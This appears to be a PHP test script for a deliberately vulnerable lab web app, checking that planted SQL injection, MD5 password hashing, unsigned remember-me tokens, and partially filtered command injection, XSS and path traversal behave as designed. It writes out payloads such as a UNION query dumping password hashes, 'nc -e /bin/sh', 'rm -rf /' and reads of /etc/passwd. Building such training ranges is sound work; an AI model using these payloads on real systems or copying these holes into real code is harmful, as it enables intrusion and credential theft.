<?php
// Direct-logic verification of the vulnerability sinks and containment rules.
// Does not require a running HTTP server. Run: php scripts/verify_logic.php
error_reporting(E_ALL & ~E_DEPRECATED & ~E_WARNING & ~E_NOTICE);
putenv('DB_HOST=127.0.0.1');
$root = dirname(__DIR__);
require "$root/src/config.php";
require "$root/src/db.php";
require "$root/src/security.php";
require "$root/src/containment.php";

$pass = 0; $fail = 0;
function ck(string $n, bool $ok): void { global $pass, $fail; $ok ? $pass++ : $fail++; echo ($ok ? 'PASS' : 'FAIL') . " $n\n"; }

/* A05 CWE-89: the /track query is concatenated and injectable */
$ref = "' UNION SELECT username,password_hash,email,role,id FROM users-- -";
$sql = "SELECT order_number, status, ship_name, shipping_method, total FROM orders WHERE order_number = '" . $ref . "'";
$rows = db()->query($sql)->fetchAll();
ck('A05 CWE-89 UNION SQLi returns user rows', (bool) array_filter($rows, fn($r) => str_contains(json_encode($r), '@fetedecadre.local')));

/* containment: app DB account has no FILE privilege */
$rows2 = db()->query("SELECT order_number, total FROM orders WHERE order_number='' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -")->fetchAll();
ck('A05 containment: LOAD_FILE denied (no FILE priv)', !array_filter($rows2, fn($r) => str_contains(json_encode($r), 'root:')));

/* A04 CWE-328: unsalted MD5 */
ck('A04 CWE-328 hash_password is md5', hash_password('gallery1') === md5('gallery1'));
$u = q1('SELECT password_hash FROM users WHERE username=?', ['admin']);
ck('A04 admin hash == md5(gallery1)', $u['password_hash'] === md5('gallery1'));

/* A07 CWE-287: unsigned remember-me */
ck('A07 CWE-287 remember token is plain base64', base64_decode(base64_encode('admin|0')) === 'admin|0');

/* XSS containment */
ck('XSS blocks <script>', xss_blocked('<script>x</script>'));
ck('XSS blocks alert (plain + encoded)', xss_blocked('alert(1)') && xss_blocked('<img src=x onerror=&#97;lert(1)>') && xss_blocked('<svg onload=\u0061lert(1)>'));
ck('XSS allows other tags/handlers', !xss_blocked('<img src=x onerror=confirm(1)>') && !xss_blocked('<svg onload=prompt(1)>'));

/* Command injection containment */
ck('cmd allows uname/id/pwd/hostname/whoami', (bool) build_ping('127.0.0.1; uname') && (bool) build_ping('127.0.0.1 | whoami') && (bool) build_ping('127.0.0.1 && id') && (bool) build_ping('127.0.0.1; pwd') && (bool) build_ping('127.0.0.1; hostname'));
ck('cmd blocks everything else', !build_ping('127.0.0.1; ls') && !build_ping('127.0.0.1; cat /etc/passwd') && !build_ping('127.0.0.1; nc -e /bin/sh x 1') && !build_ping('8.8.8.8; rm -rf /'));

/* Path traversal containment */
ck('traversal reaches /etc/passwd + /etc/hosts', (bool) resolve_download("$root/storage/invoices", '/etc/passwd') && (bool) resolve_download("$root/storage/invoices", '/etc/hosts'));
ck('traversal blocks other paths', !resolve_download("$root/storage/invoices", '/etc/shadow') && !resolve_download("$root/storage/invoices", '../../src/config.php') && !resolve_download("$root/storage/invoices", '../../.env'));

echo "\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
